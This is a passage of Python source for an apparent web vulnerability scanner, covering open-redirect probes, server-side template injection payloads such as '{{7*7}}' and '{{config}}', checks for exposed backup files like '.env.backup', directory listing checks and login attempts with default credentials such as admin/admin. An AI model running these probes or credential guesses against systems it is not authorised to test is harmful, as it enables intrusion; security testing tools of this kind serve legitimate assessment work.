            params = parse_qs(parsed_url.query)

            for param_name in params:
                # Focus on parameters likely to be redirect-related
                if any(keyword in param_name.lower() for keyword in ['redirect', 'url', 'return', 'goto', 'next', 'continue', 'target']):

                    for payload in self.payloads['open_redirect']:
                        test_params = params.copy()
                        test_params[param_name] = [payload]

                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

                        try:
                            response = self.session.get(test_url, timeout=5, allow_redirects=False)

                            # Check for redirect responses
                            if response.status_code in [301, 302, 303, 307, 308]:
                                location = response.headers.get('Location', '')

                                # Check if redirecting to external domain
                                if any(domain in location.lower() for domain in ['evil.com', 'google.com']):
                                    self.add_vulnerability(
                                        'open_redirect',
                                        'medium',
                                        test_url,
                                        payload,
                                        f"Open Redirect detected - redirects to: {location}",
                                        f"Parameter: {param_name}"
                                    )

                                # Check for protocol manipulation
                                elif location.startswith('javascript:') or location.startswith('data:'):
                                    self.add_vulnerability(
                                        'open_redirect',
                                        'high',
                                        test_url,
                                        payload,
                                        f"Dangerous redirect detected - {location[:50]}...",
                                        f"Parameter: {param_name}"
                                    )

                        except requests.exceptions.RequestException:
                            continue

    def test_ssti_realistic(self, url):
        """Enhanced Server-Side Template Injection testing"""
        print(f"{Colors.BLUE}[*] Testing Server-Side Template Injection (Enhanced)...{Colors.END}")

        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name in params:
                for payload in self.payloads['ssti']:
                    test_params = params.copy()
                    test_params[param_name] = [payload]

                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

                    try:
                        response = self.session.get(test_url, timeout=5)

                        # Check for template evaluation
                        if payload == "{{7*7}}" and "49" in response.text:
                            self.add_vulnerability(
                                'ssti',
                                'high',
                                test_url,
                                payload,
                                "Server-Side Template Injection - mathematical operation executed",
                                f"Parameter: {param_name}"
                            )
                        elif payload == "${7*7}" and "49" in response.text:
                            self.add_vulnerability(
                                'ssti',
                                'high',
                                test_url,
                                payload,
                                "Server-Side Template Injection (JSP/EL) detected",
                                f"Parameter: {param_name}"
                            )
                        elif "{{config}}" in payload and any(keyword in response.text.lower() for keyword in ['secret', 'key', 'debug', 'config']):
                            self.add_vulnerability(
                                'ssti',
                                'high',
                                test_url,
                                payload,
                                "Template configuration disclosure - sensitive info revealed",
                                f"Parameter: {param_name}"
                            )

                    except requests.exceptions.RequestException:
                        continue

    def scan_common_vulnerabilities(self, url):
        """Scan for common web vulnerabilities with additional checks"""

        # Check for common security headers
        self.check_security_headers(url)

        # Check for directory listings
        self.check_directory_listing(url)

        # Check for backup files
        self.check_backup_files(url)

        # Check for default credentials
        self.check_default_credentials(url)

    def check_security_headers(self, url):
        """Check for missing security headers"""
        print(f"{Colors.BLUE}[*] Checking security headers...{Colors.END}")

        try:
            response = self.session.get(url, timeout=5)
            headers = response.headers

            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=',
                'Content-Security-Policy': 'default-src',
                'Referrer-Policy': 'no-referrer'
            }

            missing_headers = []

            for header, expected in security_headers.items():
                if header not in headers:
                    missing_headers.append(header)
                elif isinstance(expected, list):
                    if not any(exp in headers[header] for exp in expected):
                        missing_headers.append(f"{header} (improper value)")
                elif expected not in headers.get(header, ''):
                    missing_headers.append(f"{header} (improper value)")

            if missing_headers:
                self.add_vulnerability(
                    'security_headers',
                    'low',
                    url,
                    ', '.join(missing_headers),
                    f"Missing or improper security headers: {', '.join(missing_headers)}",
                    "Recommendation: Implement proper security headers"
                )

        except requests.exceptions.RequestException:
            pass

    def check_directory_listing(self, url):
        """Check for directory listing vulnerabilities"""
        print(f"{Colors.BLUE}[*] Checking for directory listings...{Colors.END}")

        common_dirs = [
            '/admin/',
            '/backup/',
            '/config/',
            '/database/',
            '/files/',
            '/images/',
            '/uploads/',
            '/temp/',
            '/logs/',
            '/includes/'
        ]

        for directory in common_dirs:
            test_url = urljoin(url, directory)

            try:
                response = self.session.get(test_url, timeout=3)

                # Check for directory listing indicators
                if response.status_code == 200:
                    listing_indicators = [
                        'Index of /',
                        'Directory Listing',
                        '<title>Index of',
                        'Parent Directory',
                        '[DIR]',
                        'apache/',
                        'nginx/'
                    ]

                    if any(indicator in response.text for indicator in listing_indicators):
                        self.add_vulnerability(
                            'directory_listing',
                            'medium',
                            test_url,
                            directory,
                            f"Directory listing enabled for: {directory}",
                            "Sensitive files may be exposed"
                        )

            except requests.exceptions.RequestException:
                continue

    def check_backup_files(self, url):
        """Check for exposed backup files"""
        print(f"{Colors.BLUE}[*] Checking for backup files...{Colors.END}")

        parsed_url = urlparse(url)
        base_name = parsed_url.path.rstrip('/')

        backup_extensions = [
            '.bak',
            '.backup',
            '.old',
            '.orig',
            '.copy',
            '.tmp',
            '~',
            '.save'
        ]

        backup_files = [
            '/backup.sql',
            '/database.sql',
            '/config.php.bak',
            '/wp-config.php.old',
            '/.env.backup',
            '/settings.php~',
            '/index.php.orig'
        ]

        # Test common backup file names
        for backup_file in backup_files:
            test_url = urljoin(url, backup_file)

            try:
                response = self.session.get(test_url, timeout=3)

                if response.status_code == 200 and len(response.text) > 100:
                    self.add_vulnerability(
                        'backup_files',
                        'medium',
                        test_url,
                        backup_file,
                        f"Exposed backup file: {backup_file}",
                        "May contain sensitive information"
                    )

            except requests.exceptions.RequestException:
                continue

    def check_default_credentials(self, url):
        """Check for default credentials on login forms"""
        print(f"{Colors.BLUE}[*] Checking for default credentials...{Colors.END}")

        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', ''),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('guest', 'guest'),
            ('test', 'test'),
            ('demo', 'demo'),
            ('user', 'user')
        ]

        for form in self.forms:
            if not form['inputs']:
                continue

            # Check if form looks like a login form
            input_names = [inp['name'].lower() for inp in form['inputs']]
            if any('user' in name or 'login' in name or 'email' in name for name in input_names) and \
               any('pass' in name for name in input_names):

                for username, password in default_creds[:3]:  # Test first 3 combinations
                    form_data = {}

                    for input_field in form['inputs']:
                        field_name = input_field['name'].lower()
                        if 'user' in field_name or 'login' in field_name or 'email' in field_name:
                            form_data[input_field['name']] = username
                        elif 'pass' in field_name:
                            form_data[input_field['name']] = password
                        else:
                            form_data[input_field['name']] = input_field.get('value', '')

                    try:
                        if form['method'] == 'post':
                            response = self.session.post(form['action'], data=form_data, timeout=5)
                        else:
                            response = self.session.get(form['action'], params=form_data, timeout=5)

                        # Check for successful login indicators
                        success_indicators = [
                            'welcome',
                            'dashboard',
                            'logout',
                            'profile',
                            'admin panel',
                            'successfully logged in'
                        ]

                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            if response.status_code == 200 and 'error' not in response.text.lower():
                                self.add_vulnerability(
